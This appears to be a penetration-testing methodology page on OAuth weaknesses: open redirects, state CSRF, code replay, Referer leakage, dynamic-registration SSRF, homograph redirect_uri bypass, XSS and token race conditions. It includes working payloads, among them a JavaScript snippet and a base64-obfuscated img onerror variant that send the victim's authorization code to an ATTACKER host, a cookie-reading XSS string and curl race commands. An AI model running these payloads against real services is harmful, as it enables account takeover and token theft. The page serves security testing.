# OAuth Weaknesses

## Check List



## Methodology

### Black Box

{% stepper %}
{% step %}
Target Areas on Websites

* Authorization endpoints: `/oauth/authorize`, `/authorize`, `/oauth2/authorize`
* Token endpoints: `/oauth/token`, `/token`, `/oauth2/token`
* Redirect/callback endpoints: `/callback`, `/signin-oidc`, `/oauth/callback`
* Client registration & developer console pages
* Metadata endpoints: `/.well-known/openid-configuration` or `/.well-known/oauth-authorization-server`
* SPA pages using fragment-based tokens (`#access_token=...`) or storing tokens in browser storage
* Pages generating external links or redirects (to check Referer leakage)


{% endstep %}

{% step %}
Identify endpoints accepting `redirect_uri`
{% endstep %}

{% step %}
Use a controlled domain: `redirect_uri=https://proof.example.com`
{% endstep %}

{% step %}
Observe the HTTP 302 response and `Location` header

{% hint style="info" %}
Malicious redirect; potential token or session theft if combined with other flaws
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### Authorization Code Injection via Unvalidated `state`

{% stepper %}
{% step %}
Missing or weak `state` validation allows an attacker to bind a malicious authorization code to a victim’s session
{% endstep %}

{% step %}
Identify `state` parameter in `/authorize`
{% endstep %}

{% step %}
Check how `state` is generated and stored
{% endstep %}

{% step %}
Send a test request and observe whether the application validates `state`
{% endstep %}
{% endstepper %}

***

#### SPA Fragment Token Exposure

{% stepper %}
{% step %}
Identify SPA pages using `#access_token` or `#id_token`
{% endstep %}

{% step %}
Inspect outgoing links and referer headers
{% endstep %}

{% step %}
Ensure no real tokens are logged
{% endstep %}
{% endstepper %}

***

#### OAuth2 Scope Escalation

{% stepper %}
{% step %}
Clients may request scopes they are not allowed; if the server does not enforce restrictions, privilege escalation is possible
{% endstep %}

{% step %}
Identify `scope` parameter in authorization requests
{% endstep %}

{% step %}
Check server-side enforcement against client-allowed scopes
{% endstep %}
{% endstepper %}

***

#### **OAuth Flow Manipulation**

{% stepper %}
{% step %}
Turn ON the interception
{% endstep %}

{% step %}
Initiate the OAuth login proccess
{% endstep %}

{% step %}
In the last step replace your identification data with the victim id

```json
POST /auth HTTP/1.1
Host : example.com
Content-Type : 133

{
    "email":"$EMAIL"
    "username":"$USER"
    "token":$TOKEN
}
```
{% endstep %}

{% step %}
Forward the modified request
{% endstep %}

{% step %}
Check if you are logged in as a victim

{% hint style="info" %}
The Authorization Code should be tight to only user started the OAuth process. Use Authorization Code Grant type, instead of Implicit Grant type. Use the [Authorization Code flow](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-proof-key-for-code-exchange-pkce) with [PKCE](https://oauth.net/2/pkce/)
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### **OAuth Account-Linking CSRF**

{% stepper %}
{% step %}
Check if there is a CSRF protection and test it The attacker could hijack the victim's account by conducting a Cross-Site Request Forgery attack
{% endstep %}

{% step %}
Log in to the Attackers Account&#x20;
{% endstep %}

{% step %}
Turn ON the interception
{% endstep %}

{% step %}
initiate the proccess of Attaching the socail media account&#x20;
{% endstep %}

{% step %}
On the request with the linking code

* if it is a <sub>GET</sub> Request , then copy the whole URL
* if it is a <sub>POST</sub> Request , generate a CSRF Poc using Burp Suite
{% endstep %}

{% step %}
After that drop this Request&#x20;
{% endstep %}

{% step %}
Logout&#x20;
{% endstep %}

{% step %}
Log in to the victims  account&#x20;
{% endstep %}

{% step %}
Open  the copied (in the 3rd step) URL or the generated CSRF Poc URL
{% endstep %}

{% step %}
Logout
{% endstep %}

{% step %}
Access the victim account using the social media account
{% endstep %}
{% endstepper %}

***

#### **Authorization Code Leakage via Referer (Referer-based Token Exposure)**

{% stepper %}
{% step %}
Browse to a 3rd party page from the URL with sensitive data. If the Authorization Code is reflected inside the Referer header while visiting the third-party site, it can be leaked by the  attacker and reused to hijack the victim's account like this

```http
GET / HTTP/1.1
Host : example
Referer : https://example/oaut-linking?code=$TOEN
```
{% endstep %}
{% endstepper %}

***

#### **Authorization Code Replay / Authorization Code Reuse**

{% stepper %}
{% step %}
Check if you can reuse the Authorization Code after a few time later In case of Authorization Code leakage, the attacker could reuse it to exchange it for Access Token and hijack the victim's account
{% endstep %}

{% step %}
Complete an entrie OAuth process and save the authorization code
{% endstep %}

{% step %}
Complete the OAuth Flow again , but replace the authorization code with the one Saved From step 1&#x20;
{% endstep %}

{% step %}
Ensure that the OAuth process fails&#x20;

If Authorization Code is exchanged for an Access Token, invalidate the Authorization Code and not issue any more Access Token against it. For the JWT tokens use the Refresh Token mechanism to extend it
{% endstep %}
{% endstepper %}

***

#### [OAuth Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration#grabbing-oauth-token-via-redirect_uri)

{% stepper %}
{% step %}
Turn ON the interception
{% endstep %}

{% step %}
Initiate the OAuth process
{% endstep %}

{% step %}
Send the request with the redirect\_uri parameter to the repeater

```http
GET /OAuth/auth?client_id=asd&redirect_uri=https://example.com&response_type=code HTTP/1.1
Host: example.com
```
{% endstep %}

{% step %}
Detect the Open Redirect vulnerability Simple Open Redirect - replace the redirect\_uri parameter with the domain under your control

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://attacker.com HTTP/1.1
Host: example.com
```
{% endstep %}

{% step %}
#### Second Order SSRF

* &#x20;start the HTTP Listener on ports 80 & 443 and repeat the SIMPLE OPEN REDIRECT
* Check the collaborator if you get the HTTP interaction, for example

```http
GET /OAuth/auth-callback?code=0SwG-3tuLQ9y8GNv2lNYt0mzBTPLKxtzLdw HTTP/1.1
Host: example.com
```
{% endstep %}

{% step %}
#### Path Bypass&#x20;

* manipulate path to access the same endpoint in different ways, together with Open Redirect

```http
GET /OAuth/////?client_id=1234&redirect_uri=https://example.com HTTP/1.1
GET /OAuth/./././?client_id=1234&redirect_uri=https://example.com HTTP/1.1
GET /OAuth/./../auth?client_id=1234&redirect_uri=https://example.com HTTP/1.1
```
{% endstep %}

{% step %}
#### Parameter Pollution&#x20;

* reuse the redirect\_uri parameter

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com&redirect_uri=https://attacker.com HTTP/1.1
```
{% endstep %}

{% step %}
#### Referer Based Redirection

* host the below script on your server, visit it, then use SSO

```html
<html><a href="https://example/login">click on this link</a></html>
```
{% endstep %}

{% step %}
#### &#x20; Fuzzing Open Redirction & Second Order SSRF&#x20;

* Generate a payload list using crimson\_redirector
* USAGE: crimson\_redirector.py whitelisted\_domain domain\_collab vps\_ip redirect\_parameter\_name
* EXAMPLE: crimson\_redirector.py whitelisted.com col.example.com 123.123.123.123 redirect\_uri
{% endstep %}

{% step %}
Start the HTTP Listener on the VPS server
{% endstep %}

{% step %}
Start the fuzzing the parameter value using Burp Suite
{% endstep %}

{% step %}
Check the output of the Intruder for any suspicious responses
{% endstep %}
{% endstepper %}

***

#### [XSS IN OAuth Flow](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration#executing-xss-via-redirect_uri)

{% stepper %}
{% step %}
Redirect flow to the static endpoint on the same domain to break it
{% endstep %}

{% step %}
The attacker could use the static endpoint within the application to break the execution flow. Then, prevent the application from consuming the single-use Authorization Code.Then, chain it with an XSS vulnerability found in any endpoint across the application to leak the Authorization Code
{% endstep %}

{% step %}
Identify that the application allows redirecting the user to other paths on the same domain
{% endstep %}

{% step %}
Try exploiting the XSS vulnerability on one of these endpoints
{% endstep %}

{% step %}
If it does not work, search for a static endpoint (401.html) which should break the OAuth flow

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com/401.html HTTP/1.1
```
{% endstep %}

{% step %}
Use the XSS on the other endpoint with the below content, to break the flow and leak the access key

```javascript
javascript:x=window.open("https://example.com/callback?redirectUrl=https://TARGET/401.html");setTimeout(function() {document.location="http://ATTACKER/?c="+x.location;},5000);
```
{% endstep %}

{% step %}
Example of an XSS payload to exploit the issue (Credits to [Dawid](https://github.com/mackeysec) from [AFINE](https://afine.pl/) for finding this)

```javascript
<img src=x onerror=location=atob`amF2YXNjcmlwdDp4PXdpbmRvdy5vcGVuKCJodHRwczovL1RBUkdFVC9jYWxsYmFjaz9yZWRpcmVjdFVybD1odHRwczovL1RBUkdFVC80MDEuaHRtbCIpO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL0FUVEFDS0VSLz9jPScreC5sb2NhdGlvbjt9LDUwMDApOw==`>
```
{% endstep %}

{% step %}
Require client applications to register a whitelist of valid <sub>redirect\_uris</sub>. Use strict byte-to-byte comparison to validate the URI. Allow complete and exact matches
{% endstep %}
{% endstepper %}

***

#### Path Traversal

{% stepper %}
{% step %}
Redirect flow to the endpoint on the same domain using path traversal. The attacker could use the vulnerability on the other endpoint within the application and the new path as a proxy page to steal a victim's Access Token, thus hijacking his account
{% endstep %}

{% step %}
Turn ON the interception
{% endstep %}

{% step %}
Initiate the OAuth process
{% endstep %}

{% step %}
Send the request with the <sub>redirect\_uri</sub> parameter to the repeater

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com/callback HTTP/1.1
Host: example.com
```
{% endstep %}

{% step %}
Change the path using PATH TRAVERSAL to redirect the flow to another endpoint

```http
GET /OAuth/auth?client_id=1234&redirect_uri=https://example.com/callback/../vuln HTTP/1.1
```
{% endstep %}

{% step %}
If it is possible to redirect the user to another endpoint (/vuln), there is a vulnerability FUZZING PATH TRAVERSAL Check the other <sub>PATH TRAVERSAL</sub> bypasses using the <sub>TRAVERSAL\_DIR\_ONLY</sub> wordlist
{% endstep %}
{% endstepper %}

***

#### Dynamic Registration SSRF

{% stepper %}
{% step %}
Check if it is possible to register your client application. Discover the OpenID client registration endpoint: Using the configuration file <sub>/.well-known/openid-configuration</sub> By the directory brute-forcing (dir\_wordlist)
{% endstep %}

{% step %}
Fuzz the POST body to find proper parameters - a good start is to use just

```json
POST /client_register HTTP/1.1
Host: oauth.example.com
Content-Type: application/json

{"redirect_uris": ["https://whitelist.com/callback"]}
```
{% endstep %}

{% step %}
If you get the 200 OK response with a <sub>CLIENT\_ID</sub> in the body, it is likely vulnerable

> The OpenID provider should require the client application to authenticate itself. For instance, use an HTTP bearer token
{% endstep %}
{% endstepper %}

***

#### OpenID Dynamic Registration SSRF

{% stepper %}
{% step %}
Find the OpenID registration endpoint and check for SSRF

```json
POST /client_register HTTP/1.1
Host: oauth.example.com
Content-Type: application/json
{"redirect_uris": ["https://whitelisted.com/callback"]}
```
{% endstep %}

{% step %}
Use a private collaborator in place of the WHITELISTED.COM domain to check for SSRF vulnerability
{% endstep %}

{% step %}
Fuzz the POST body to discover more URI parameters (see the PortSwigger example below)
{% endstep %}

{% step %}
Fuzz the URI parameters values using SSRF wordlist and the one generated with crimson\_redirector.py
{% endstep %}

{% step %}
After discovering <sub>UNVERIFIED CLIENT REGISTRATION</sub>, inject domain collaborator in every URI-like parameter value

```http
POST /client_register HTTP/1.1
Host: example
Content-Type: application/json
{
  "redirect_uris": ["https://example.com/callback"],
  "jwks_uri": "https://jwks.example.com/my_public_keys_jwks",
  "logo_uri": "https://logo.example.com/logo.png"
}
```
{% endstep %}

{% step %}
Find a way to trigger the server somehow to use these URLs
{% endstep %}

{% step %}
One way is to use the <sub>CLIENT\_ID</sub> parameter value from the server response after registering the client
{% endstep %}

{% step %}
Find the endpoint that fetches the logo (it should be one of the endpoints used during OAuth flow)
{% endstep %}

{% step %}
Use the <sub>CLIENT\_ID</sub> to trigger the server interaction

```http
GET /client/CLIENT_ID/logo HTTP/1.1
```
{% endstep %}

{% step %}
Observe the <sub>DNS/HTTP</sub> out-of-bound interactions in your collaborator server
{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}
#### OAuth Parameters

| Parameter                | Usage Location                                                               |
| ------------------------ | ---------------------------------------------------------------------------- |
| client\_id               | authorization request, token request                                         |
| client\_secret           | token request                                                                |
| response\_type           | authorization request                                                        |
| redirect\_uri            | authorization request, token request                                         |
| scope                    | authorization request, authorization response, token request, token response |
| state                    | authorization request, authorization response                                |
| code                     | authorization response, token request                                        |
| error                    | authorization response, token response                                       |
| error\_description       | authorization response, token response                                       |
| error\_uri               | authorization response, token response                                       |
| grant\_type              | token request                                                                |
| access\_token            | authorization response, token response                                       |
| token\_type              | authorization response, token response                                       |
| expires\_in              | authorization response, token response                                       |
| username                 | token request                                                                |
| password                 | token request                                                                |
| refresh\_token           | token request, token response                                                |
| nonce                    | authorization request                                                        |
| display                  | authorization request                                                        |
| prompt                   | authorization request                                                        |
| max\_age                 | authorization request                                                        |
| ui\_locales              | authorization request                                                        |
| claims\_locales          | authorization request                                                        |
| id\_token\_hint          | authorization request                                                        |
| login\_hint              | authorization request                                                        |
| acr\_values              | authorization request                                                        |
| claims                   | authorization request                                                        |
| registration             | authorization request                                                        |
| request                  | authorization request                                                        |
| request\_uri             | authorization request                                                        |
| id\_token                | authorization response, access token response                                |
| session\_state           | authorization response, access token response                                |
| assertion                | token request                                                                |
| client\_assertion        | token request                                                                |
| client\_assertion\_type  | token request                                                                |
| code\_verifier           | token request                                                                |
| code\_challenge          | authorization request                                                        |
| code\_challenge\_method  | authorization request                                                        |
| claim\_token             | client request, token endpoint                                               |
| pct                      | client request, token endpoint                                               |
| pct                      | authorization server response, token endpoint                                |
| rpt                      | client request, token endpoint                                               |
| ticket                   | client request, token endpoint                                               |
| upgraded                 | authorization server response, token endpoint                                |
| vtr                      | authorization request, token request                                         |
| device\_code             | token request                                                                |
| resource                 | authorization request, token request                                         |
| audience                 | token request                                                                |
| requested\_token\_type   | token request                                                                |
| subject\_token           | token request                                                                |
| subject\_token\_type     | token request                                                                |
| actor\_token             | token request                                                                |
| actor\_token\_type       | token request                                                                |
| issued\_token\_type      | token response                                                               |
| response\_mode           | authorization request                                                        |
| nfv\_token               | access token response                                                        |
| iss                      | authorization request, authorization response                                |
| sub                      | authorization request                                                        |
| aud                      | authorization request                                                        |
| exp                      | authorization request                                                        |
| nbf                      | authorization request                                                        |
| iat                      | authorization request                                                        |
| jti                      | authorization request                                                        |
| ace\_profile             | token response                                                               |
| nonce1                   | client-rs request                                                            |
| nonce2                   | rs-client response                                                           |
| ace\_client\_recipientid | client-rs request                                                            |
| ace\_server\_recipientid | rs-client response                                                           |
| req\_cnf                 | token request                                                                |
| rs\_cnf                  | token response                                                               |
| cnf                      | token response                                                               |
| authorization\_details   | authorization request, token request, token response                         |
| dpop\_jkt                | authorization request                                                        |
| sign\_info               | client-rs request, rs-client response                                        |
| kdcchallenge             | rs-client response                                                           |
| trust\_chain             | (no usage location provided)                                                 |
{% endstep %}
{% endstepper %}

***

#### PaniCode Bypass&#x20;

{% stepper %}
{% step %}
The attacker takes control of the homograph/IDN domain (for example, a domain that looks like oauth.example.com)
{% endstep %}

{% step %}
The attacker creates an authorize address whose redirect\_uri parameter points to this domain (with Unicode characters)
{% endstep %}

{% step %}
The user logs in and authorizes (or if already authorized, the process appears without interaction)
{% endstep %}

{% step %}
The SEMrush server mistakenly considers the redirect\_uri to be valid and sends the authorization code to the attacker's domain (the browser converts it to a paniccode)
{% endstep %}

{% step %}
The attacker takes the code and converts it into an access token and gains access to the user's information/operations

for example request

```
https://oauth.example.com/oauth2/authorize?
response_type=code&
scope=user.info,projects.info,siteaudit.info&
client_id=seoquake&
redirect_uri=https://oauth.example.com/oauth2/success
```
{% endstep %}

{% step %}
I convert the domain inside the redirect\_uri parameter to paniccode and send the request

{% hint style="info" %}


* sémrush.com
* sêmrush.com
* sèmrûsh.com
* šemrush.com
* etc.
{% endhint %}
{% endstep %}

{% step %}
```
https://oauth.semrush.com/oauth2/authorize?
response_type=code&
scope=user.info,projects.info,siteaudit.info&
client_id=seoquake&
redirect_uri=https://oauth.šemrush.com/oauth2/success
```
{% endstep %}
{% endstepper %}

***

#### XSS in Errors Parameters OAuth Flow

{% stepper %}
{% step %}
We do the authentication process inside OAuth and I get the requests using Burp Suite
{% endstep %}

{% step %}
We do a part of the process wrongly to see the error parameter in the requests\
Like this request

```url
Full url:https://auth2.example.com/oauth2/fallbacks/error?error=xss&error_description=xss&error_hint=xss
```
{% endstep %}

{% step %}
If we see one of these parameters in the requests, we will inject this XSS code

```javascript
<marquee loop%3d1 width%3d0 onfinish%3dco\u006efirm(document.cookie)>XSS<%2fmarquee>
```
{% endstep %}

{% step %}
for example

```javascript
https://auth2.example.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco\u006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E
```
{% endstep %}
{% endstepper %}

***

#### Race Condition in OAuth

{% stepper %}
{% step %}
Register Application Register an OAuth 2.0 application on the target provider and obtain client\_id, client\_secret, and redirect\_uri
{% endstep %}

{% step %}
Authorize Application Open the authorization URL

`https://OAUTH_PROVIDER_DOMAIN/oauth/authorize client_id=APPLICATION_ID&redirect_uri=https://APPLICATION_REDIRECT_URI&response_type=code,`&#x20;

log in as victim, and allow access
{% endstep %}

{% step %}
Obtain Authorization Code Capture the code from the callback

`https://APPLICATION_REDIRECT_URI?code=AUTHORIZATION_CODE_VALUE`
{% endstep %}

{% step %}
Exploit Race Condition for Access Token Run a script to send multiple simultaneous requests

```bash
curl --data "grant_type=authorization_code code=AUTHORIZATION_CODE_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET&redirect_uri=APPLICATION_REDIRECT_URI" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" repeated 20 times
```
{% endstep %}

{% step %}
Verify Multiple Tokens Check obtained access\_tokens by sending

&#x20;`GET /api/me?access_token=ACCESS_TOKEN_VALUE to OAUTH_PROVIDER_DOMAIN;`

&#x20;all should be valid
{% endstep %}

{% step %}
Revoke Access and Test Revoke access via settings or `/oauth/revoke` for one token, then retest all tokens to see if others remain active
{% endstep %}

{% step %}
Exploit Race Condition for Refresh Token After obtaining initial access\_token and refresh\_token legally, run a script to send multiple simultaneous requests

```bash
 curl --data "grant_type=refresh_token&refresh_token=REFRESH_TOKEN_VALUE&client_id=APPLICATION_ID&client_secret=APPLICATION_SECRET" "https://OAUTH_PROVIDER_DOMAIN/oauth/token" repeated 20 times
```
{% endstep %}

{% step %}
Verify Multiple Refresh Tokens Check new access\_tokens as before; all should be valid, and repeat revocation test to confirm persistence
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
